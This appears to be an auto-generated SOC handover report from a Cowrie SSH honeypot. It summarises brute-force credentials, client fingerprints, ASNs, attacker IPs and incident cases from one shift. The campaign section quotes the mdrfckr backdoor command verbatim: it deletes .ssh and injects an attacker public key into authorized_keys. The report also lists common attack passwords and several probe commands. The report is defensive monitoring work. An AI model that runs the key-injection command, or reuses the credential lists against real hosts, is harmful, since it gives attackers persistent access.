# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-10 |
| **Generated At** | 2026-11-10T19:03:36Z |
| **Shift Time** | 19:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **293** |
| Confirmed Threats | **237** |
| False Positives Filtered | **56** (19.1%) |
| Unique Attacker IPs | **161** |
| Countries of Origin | **43** |
| High Severity Cases | **144** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **149** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **4552** |
| Unique Credential Pairs | **2365** |
| Unique Usernames | **576** |
| Unique Passwords | **1801** |
| Successful Auth Pairs | **4369** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 2135 |
| `ubuntu` | 108 |
| `admin` | 104 |
| `user` | 71 |
| `deploy` | 63 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 210 |
| `123` | 115 |
| `1234` | 78 |
| `12345678` | 53 |
| `root` | 51 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 46 |
| `root` | `root3245gs5662d34111111111` | 40 |
| `support` | `support` | 35 |
| `root` | `admin` | 20 |
| `root` | `123456` | 10 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Zza123456` | `109.160.32.41` | 2026-11-10T04:55:05 |
| `root` | `password123` | `109.160.32.41` | 2026-11-10T04:55:14 |
| `ubuntu` | `root123` | `109.160.32.41` | 2026-11-10T04:55:21 |
| `root` | `qwerty12345` | `109.160.32.41` | 2026-11-10T04:55:28 |
| `root` | `bocheng@xinxi2023` | `109.160.32.41` | 2026-11-10T04:55:35 |
| `cs216` | `abc123` | `109.160.32.41` | 2026-11-10T04:55:44 |
| `runner` | `runner` | `109.160.32.41` | 2026-11-10T04:55:54 |
| `root` | `P@55word` | `109.160.32.41` | 2026-11-10T04:56:02 |
| `cctv` | `123` | `109.160.32.41` | 2026-11-10T04:56:11 |
| `a` | `a` | `109.160.32.41` | 2026-11-10T04:56:18 |
| `ubuntu` | `1qaz@WSX` | `109.160.32.41` | 2026-11-10T04:56:29 |
| `us81` | `pass123` | `109.160.32.41` | 2026-11-10T04:56:35 |
| `ubuntu` | `A123456a` | `109.160.32.41` | 2026-11-10T04:56:42 |
| `carl` | `carl@123` | `109.160.32.41` | 2026-11-10T04:56:50 |
| `root` | `jetsum@142025` | `109.160.32.41` | 2026-11-10T04:57:00 |
| `deploy` | `deploy@123` | `109.160.32.41` | 2026-11-10T04:57:08 |
| `root` | `3132333435` | `109.160.32.41` | 2026-11-10T04:57:15 |
| `mysql` | `mysql` | `109.160.32.41` | 2026-11-10T04:57:22 |
| `splunk` | `password` | `109.160.32.41` | 2026-11-10T04:57:28 |
| `user` | `user` | `109.160.32.41` | 2026-11-10T04:57:37 |
_… 4349 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **293** |
| Sessions with Fingerprint | **25** |
| Unique HASSH Fingerprints | **25** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 92 |
| libssh | 47 |
| OpenSSH | 14 |
| Paramiko (Python) | 7 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 48 | 3 |
| `f555226df196...` | Mirai/variant | 38 | 20 |
| `0a07365cc01f...` | Generic scanner | 13 | 5 |
| `eff4c24daffc...` | Modern SSH client | 7 | 1 |
| `03a80b21afa8...` | Modern SSH client | 7 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 48 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 38 | 20 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 13 | 5 | Generic scanner |
| `95420f9d932d...` | OpenSSH | 10 | 10 | — |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 7 | 3 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 5 | 5 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 5 | 3 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **64** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 34 | 20 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
linuxshell
```
Source IPs: `200.115.64.149`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.155.244.201`, `45.232.73.84`, `4.206.92.183`, `49.0.27.202`, `4.210.91.174`, `185.227.152.135`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **161** |
| Unique ASNs | **81** |
| High-Risk ASNs | **52** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 46 | HIGH |
| `AS14061` | DigitalOcean, LLC | 8 | HIGH |
| `AS8075` | Microsoft Corporation | 7 | HIGH |
| `AS396982` | Google LLC | 6 | LOW |
| `AS25369` | Hydra Communications Ltd | 5 | LOW |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS15169` | Google LLC | 3 | HIGH |
| `AS10439` | CariNet, Inc. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (137)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8b0a726ee429

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]41` |
| **First Seen** | 2026-11-10 04:55 |
| **Last Seen** | 2026-11-10 04:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 04:55:09` | `cowrie.session.connect` |
| `2026-11-10 04:55:10` | `cowrie.client.version` |
| `2026-11-10 04:55:10` | `cowrie.client.kex` |
| `2026-11-10 04:55:14` | `cowrie.login.success` |
| `2026-11-10 04:55:16` | `cowrie.session.params` |
| `2026-11-10 04:55:16` | `cowrie.command.input` |
| `2026-11-10 04:55:17` | `cowrie.log.closed` |
| `2026-11-10 04:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]41` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952f5b0bf354

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 05:31 |
| **Last Seen** | 2026-11-10 05:33 |
| **Session Duration** | 175s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d444d07bfe38cc5fa90ef3f6e316e1b5_small_control'"'"' '"'"'check_d444d07bfe38cc5fa90ef3f6e316e1b5'"'"'', printf '\n%s|%s\n' 'check_d444d07bfe38cc5fa90ef3f6e316e1b5_small_control' 'check_d444d07bfe38cc5fa90ef3f6e316e1b5', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d444d07bfe38cc5fa90ef3f6e316e1b5_small_math'"'"' "$((503*849+21))"', (503*849+21, printf '\n%s|%s\n' 'check_d444d07bfe38cc5fa90ef3f6e316e1b5_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 05:31:01` | `cowrie.session.connect` |
| `2026-11-10 05:31:02` | `cowrie.client.version` |
| `2026-11-10 05:31:02` | `cowrie.client.kex` |
| `2026-11-10 05:31:06` | `cowrie.login.success` |
| `2026-11-10 05:31:10` | `cowrie.client.size` |
| `2026-11-10 05:31:11` | `cowrie.session.params` |
| `2026-11-10 05:31:12` | `cowrie.command.input` |
| `2026-11-10 05:31:12` | `cowrie.command.input` |
| `2026-11-10 05:31:12` | `cowrie.command.input` |
| `2026-11-10 05:31:12` | `cowrie.command.input` |
| `2026-11-10 05:31:12` | `cowrie.command.input` |
| `2026-11-10 05:31:12` | `cowrie.command.input` |
| `2026-11-10 05:31:12` | `cowrie.command.input` |
| `2026-11-10 05:31:12` | `cowrie.command.input` |
| `2026-11-10 05:31:12` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c65d50c4c53

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 05:33 |
| **Last Seen** | 2026-11-10 05:38 |
| **Session Duration** | 283s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1869d8f0a4e55e04daa103cf6ac2751d_small_control'"'"' '"'"'check_1869d8f0a4e55e04daa103cf6ac2751d'"'"'', printf '\n%s|%s\n' 'check_1869d8f0a4e55e04daa103cf6ac2751d_small_control' 'check_1869d8f0a4e55e04daa103cf6ac2751d', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1869d8f0a4e55e04daa103cf6ac2751d_small_math'"'"' "$((268*41+42))"', (268*41+42, printf '\n%s|%s\n' 'check_1869d8f0a4e55e04daa103cf6ac2751d_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 05:33:57` | `cowrie.session.connect` |
| `2026-11-10 05:33:58` | `cowrie.client.version` |
| `2026-11-10 05:33:58` | `cowrie.client.kex` |
| `2026-11-10 05:34:03` | `cowrie.login.success` |
| `2026-11-10 05:34:06` | `cowrie.client.size` |
| `2026-11-10 05:34:08` | `cowrie.session.params` |
| `2026-11-10 05:34:10` | `cowrie.command.input` |
| `2026-11-10 05:34:10` | `cowrie.command.input` |
| `2026-11-10 05:34:10` | `cowrie.command.input` |
| `2026-11-10 05:34:10` | `cowrie.command.input` |
| `2026-11-10 05:34:10` | `cowrie.command.input` |
| `2026-11-10 05:34:10` | `cowrie.command.input` |
| `2026-11-10 05:34:10` | `cowrie.command.input` |
| `2026-11-10 05:34:10` | `cowrie.command.input` |
| `2026-11-10 05:34:10` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-839a1d15a1f4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-10 05:34 |
| **Last Seen** | 2026-11-10 05:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 05:34:00` | `cowrie.session.connect` |
| `2026-11-10 05:34:00` | `cowrie.client.version` |
| `2026-11-10 05:34:00` | `cowrie.client.kex` |
| `2026-11-10 05:34:00` | `cowrie.login.success` |
| `2026-11-10 05:34:01` | `cowrie.direct-tcpip.request` |
| `2026-11-10 05:34:01` | `cowrie.direct-tcpip.data` |
| `2026-11-10 05:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2b641fcfc0a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 05:38 |
| **Last Seen** | 2026-11-10 05:43 |
| **Session Duration** | 308s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6e364a8c9ee45884aba980beed97f64f_small_control'"'"' '"'"'check_6e364a8c9ee45884aba980beed97f64f'"'"'', printf '\n%s|%s\n' 'check_6e364a8c9ee45884aba980beed97f64f_small_control' 'check_6e364a8c9ee45884aba980beed97f64f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6e364a8c9ee45884aba980beed97f64f_small_math'"'"' "$((299*256+85))"', (299*256+85, printf '\n%s|%s\n' 'check_6e364a8c9ee45884aba980beed97f64f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 05:38:40` | `cowrie.session.connect` |
| `2026-11-10 05:38:42` | `cowrie.client.version` |
| `2026-11-10 05:38:42` | `cowrie.client.kex` |
| `2026-11-10 05:38:48` | `cowrie.login.success` |
| `2026-11-10 05:38:52` | `cowrie.client.size` |
| `2026-11-10 05:38:54` | `cowrie.session.params` |
| `2026-11-10 05:38:57` | `cowrie.command.input` |
| `2026-11-10 05:38:57` | `cowrie.command.input` |
| `2026-11-10 05:38:57` | `cowrie.command.input` |
| `2026-11-10 05:38:57` | `cowrie.command.input` |
| `2026-11-10 05:38:57` | `cowrie.command.input` |
| `2026-11-10 05:38:57` | `cowrie.command.input` |
| `2026-11-10 05:38:57` | `cowrie.command.input` |
| `2026-11-10 05:38:57` | `cowrie.command.input` |
| `2026-11-10 05:38:57` | `cowrie.command.input` |
| … | _48 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c0acfcfc331

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 05:43 |
| **Last Seen** | 2026-11-10 05:47 |
| **Session Duration** | 233s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e1240b21a8c93e6424a0b40e1be2c567_small_control'"'"' '"'"'check_e1240b21a8c93e6424a0b40e1be2c567'"'"'', printf '\n%s|%s\n' 'check_e1240b21a8c93e6424a0b40e1be2c567_small_control' 'check_e1240b21a8c93e6424a0b40e1be2c567', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e1240b21a8c93e6424a0b40e1be2c567_small_math'"'"' "$((808*868+19))"', (808*868+19, printf '\n%s|%s\n' 'check_e1240b21a8c93e6424a0b40e1be2c567_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 05:43:56` | `cowrie.session.connect` |
| `2026-11-10 05:43:57` | `cowrie.client.version` |
| `2026-11-10 05:43:57` | `cowrie.client.kex` |
| `2026-11-10 05:44:07` | `cowrie.login.success` |
| `2026-11-10 05:44:10` | `cowrie.client.size` |
| `2026-11-10 05:44:11` | `cowrie.session.params` |
| `2026-11-10 05:44:12` | `cowrie.command.input` |
| `2026-11-10 05:44:12` | `cowrie.command.input` |
| `2026-11-10 05:44:12` | `cowrie.command.input` |
| `2026-11-10 05:44:12` | `cowrie.command.input` |
| `2026-11-10 05:44:12` | `cowrie.command.input` |
| `2026-11-10 05:44:12` | `cowrie.command.input` |
| `2026-11-10 05:44:12` | `cowrie.command.input` |
| `2026-11-10 05:44:12` | `cowrie.command.input` |
| `2026-11-10 05:44:12` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aaf5c5cca44

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 05:47 |
| **Last Seen** | 2026-11-10 05:51 |
| **Session Duration** | 206s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_adb491032535c2d53a7b1f91f8f26f0b_small_control'"'"' '"'"'check_adb491032535c2d53a7b1f91f8f26f0b'"'"'', printf '\n%s|%s\n' 'check_adb491032535c2d53a7b1f91f8f26f0b_small_control' 'check_adb491032535c2d53a7b1f91f8f26f0b', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_adb491032535c2d53a7b1f91f8f26f0b_small_math'"'"' "$((601*457+43))"', (601*457+43, printf '\n%s|%s\n' 'check_adb491032535c2d53a7b1f91f8f26f0b_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 05:47:49` | `cowrie.session.connect` |
| `2026-11-10 05:47:50` | `cowrie.client.version` |
| `2026-11-10 05:47:50` | `cowrie.client.kex` |
| `2026-11-10 05:47:52` | `cowrie.login.success` |
| `2026-11-10 05:47:53` | `cowrie.client.size` |
| `2026-11-10 05:47:54` | `cowrie.session.params` |
| `2026-11-10 05:47:54` | `cowrie.command.input` |
| `2026-11-10 05:47:54` | `cowrie.command.input` |
| `2026-11-10 05:47:54` | `cowrie.command.input` |
| `2026-11-10 05:47:54` | `cowrie.command.input` |
| `2026-11-10 05:47:54` | `cowrie.command.input` |
| `2026-11-10 05:47:54` | `cowrie.command.input` |
| `2026-11-10 05:47:54` | `cowrie.command.input` |
| `2026-11-10 05:47:54` | `cowrie.command.input` |
| `2026-11-10 05:47:54` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24dc82fc347e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 05:51 |
| **Last Seen** | 2026-11-10 05:53 |
| **Session Duration** | 134s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_38d8d9d82bec8bb27752724eef578610_small_control'"'"' '"'"'check_38d8d9d82bec8bb27752724eef578610'"'"'', printf '\n%s|%s\n' 'check_38d8d9d82bec8bb27752724eef578610_small_control' 'check_38d8d9d82bec8bb27752724eef578610', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_38d8d9d82bec8bb27752724eef578610_small_math'"'"' "$((595*273+3))"', (595*273+3, printf '\n%s|%s\n' 'check_38d8d9d82bec8bb27752724eef578610_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 05:51:29` | `cowrie.session.connect` |
| `2026-11-10 05:51:31` | `cowrie.client.version` |
| `2026-11-10 05:51:31` | `cowrie.client.kex` |
| `2026-11-10 05:51:36` | `cowrie.login.success` |
| `2026-11-10 05:51:41` | `cowrie.client.size` |
| `2026-11-10 05:51:43` | `cowrie.session.params` |
| `2026-11-10 05:51:44` | `cowrie.command.input` |
| `2026-11-10 05:51:44` | `cowrie.command.input` |
| `2026-11-10 05:51:44` | `cowrie.command.input` |
| `2026-11-10 05:51:44` | `cowrie.command.input` |
| `2026-11-10 05:51:44` | `cowrie.command.input` |
| `2026-11-10 05:51:44` | `cowrie.command.input` |
| `2026-11-10 05:51:44` | `cowrie.command.input` |
| `2026-11-10 05:51:44` | `cowrie.command.input` |
| `2026-11-10 05:51:44` | `cowrie.command.input` |
| … | _48 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a3430b6f4ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 05:54 |
| **Last Seen** | 2026-11-10 05:56 |
| **Session Duration** | 140s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0d81a8e63b645810149ce2e2bb1cb404_small_control'"'"' '"'"'check_0d81a8e63b645810149ce2e2bb1cb404'"'"'', printf '\n%s|%s\n' 'check_0d81a8e63b645810149ce2e2bb1cb404_small_control' 'check_0d81a8e63b645810149ce2e2bb1cb404', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0d81a8e63b645810149ce2e2bb1cb404_small_math'"'"' "$((467*626+63))"', (467*626+63, printf '\n%s|%s\n' 'check_0d81a8e63b645810149ce2e2bb1cb404_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 05:54:24` | `cowrie.session.connect` |
| `2026-11-10 05:54:25` | `cowrie.client.version` |
| `2026-11-10 05:54:25` | `cowrie.client.kex` |
| `2026-11-10 05:54:28` | `cowrie.login.success` |
| `2026-11-10 05:54:31` | `cowrie.client.size` |
| `2026-11-10 05:54:32` | `cowrie.session.params` |
| `2026-11-10 05:54:33` | `cowrie.command.input` |
| `2026-11-10 05:54:33` | `cowrie.command.input` |
| `2026-11-10 05:54:33` | `cowrie.command.input` |
| `2026-11-10 05:54:33` | `cowrie.command.input` |
| `2026-11-10 05:54:33` | `cowrie.command.input` |
| `2026-11-10 05:54:33` | `cowrie.command.input` |
| `2026-11-10 05:54:33` | `cowrie.command.input` |
| `2026-11-10 05:54:33` | `cowrie.command.input` |
| `2026-11-10 05:54:33` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0162b303d688

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 05:56 |
| **Last Seen** | 2026-11-10 06:00 |
| **Session Duration** | 211s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d3de70bcb3ddddf4dba8a9261039bc49_small_control'"'"' '"'"'check_d3de70bcb3ddddf4dba8a9261039bc49'"'"'', printf '\n%s|%s\n' 'check_d3de70bcb3ddddf4dba8a9261039bc49_small_control' 'check_d3de70bcb3ddddf4dba8a9261039bc49', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d3de70bcb3ddddf4dba8a9261039bc49_small_math'"'"' "$((401*122+16))"', (401*122+16, printf '\n%s|%s\n' 'check_d3de70bcb3ddddf4dba8a9261039bc49_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 05:56:57` | `cowrie.session.connect` |
| `2026-11-10 05:56:58` | `cowrie.client.version` |
| `2026-11-10 05:56:58` | `cowrie.client.kex` |
| `2026-11-10 05:57:03` | `cowrie.login.success` |
| `2026-11-10 05:57:06` | `cowrie.client.size` |
| `2026-11-10 05:57:08` | `cowrie.session.params` |
| `2026-11-10 05:57:08` | `cowrie.command.input` |
| `2026-11-10 05:57:08` | `cowrie.command.input` |
| `2026-11-10 05:57:08` | `cowrie.command.input` |
| `2026-11-10 05:57:08` | `cowrie.command.input` |
| `2026-11-10 05:57:08` | `cowrie.command.input` |
| `2026-11-10 05:57:08` | `cowrie.command.input` |
| `2026-11-10 05:57:08` | `cowrie.command.input` |
| `2026-11-10 05:57:08` | `cowrie.command.input` |
| `2026-11-10 05:57:08` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecc3bc9ed2f4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]41` |
| **First Seen** | 2026-11-10 06:00 |
| **Last Seen** | 2026-11-10 06:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:00:05` | `cowrie.session.connect` |
| `2026-11-10 06:00:05` | `cowrie.client.version` |
| `2026-11-10 06:00:05` | `cowrie.client.kex` |
| `2026-11-10 06:00:07` | `cowrie.login.success` |
| `2026-11-10 06:00:08` | `cowrie.session.params` |
| `2026-11-10 06:00:08` | `cowrie.command.input` |
| `2026-11-10 06:00:08` | `cowrie.log.closed` |
| `2026-11-10 06:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]41` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16bb412b2fd3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:00 |
| **Last Seen** | 2026-11-10 06:00 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dbd95e4e58c35f9e3364e52c2e15acef_small_control'"'"' '"'"'check_dbd95e4e58c35f9e3364e52c2e15acef'"'"'', printf '\n%s|%s\n' 'check_dbd95e4e58c35f9e3364e52c2e15acef_small_control' 'check_dbd95e4e58c35f9e3364e52c2e15acef', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dbd95e4e58c35f9e3364e52c2e15acef_small_math'"'"' "$((450*359+22))"', (450*359+22, printf '\n%s|%s\n' 'check_dbd95e4e58c35f9e3364e52c2e15acef_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:00:29` | `cowrie.session.connect` |
